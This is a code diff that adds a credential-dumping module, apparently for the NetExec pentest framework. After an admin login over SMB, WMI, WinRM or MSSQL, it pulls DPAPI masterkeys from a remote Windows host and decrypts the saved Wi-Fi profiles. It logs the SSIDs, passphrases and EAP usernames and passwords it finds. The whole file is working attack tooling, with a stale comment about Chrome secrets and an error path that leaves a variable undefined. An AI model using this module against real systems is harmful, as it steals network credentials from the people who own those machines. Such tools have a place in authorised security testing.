@@ -1,0 +1,47 @@
+from dploot.triage.wifi import WifiTriage
+
+from nxc.helpers.misc import CATEGORY
+
+
+class NXCModule:
+    name = "wifi"
+    description = "Get key of all wireless interfaces"
+    supported_protocols = ["smb", "wmi", "winrm", "mssql"]
+    category = CATEGORY.CREDENTIAL_DUMPING
+
+    def options(self, context, module_options):
+        """No options available"""
+
+    def on_admin_login(self, context, connection):
+        masterkeys = connection.dpapi_triage.collect_masterkeys_from_target(dump_users=False, dump_system=True)
+
+        if len(masterkeys) == 0:
+            context.log.fail("No masterkeys looted")
+            return
+
+        context.log.success("Looting Wifi interfaces")
+
+        try:
+            # Collect Chrome Based Browser stored secrets
+            wifi_triage = WifiTriage(target=connection.dpapi_triage.target, conn=connection.dpapi_triage.conn, masterkeys=masterkeys)
+            wifi_creds = wifi_triage.triage_wifi()
+        except Exception as e:
+            context.log.debug(f"Error while looting wifi: {e}")
+        for wifi_cred in wifi_creds:
+            if wifi_cred.auth.upper() == "OPEN":
+                context.log.highlight(f"[OPEN] {wifi_cred.ssid}")
+            elif wifi_cred.auth.upper() in ["WPAPSK", "WPA2PSK", "WPA3SAE"]:
+                try:
+                    connection.dpapi_triage.log_secret(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - Passphrase: {wifi_cred.password.decode('latin-1')}", self.context.log)
+                except Exception:
+                    connection.dpapi_triage.log_secret(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - Passphrase: {wifi_cred.password}", self.context.log)
+            elif wifi_cred.auth.upper() in ["WPA", "WPA2"]:
+                try:
+                    if wifi_cred.eap_username is not None and wifi_cred.eap_password is not None:
+                        connection.dpapi_triage.log_secret(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - {wifi_cred.eap_type} - Identifier: {wifi_cred.eap_username}:{wifi_cred.eap_password}", self.context.log)
+                    else:
+                        connection.dpapi_triage.log_secret(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - {wifi_cred.eap_type}", self.context.log)
+                except Exception:
+                    connection.dpapi_triage.log_secret(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - Passphrase: {wifi_cred.password}", self.context.log)
+            else:
+                context.log.highlight(f"[WPA-EAP] {wifi_cred.ssid} - {wifi_cred.eap_type}")
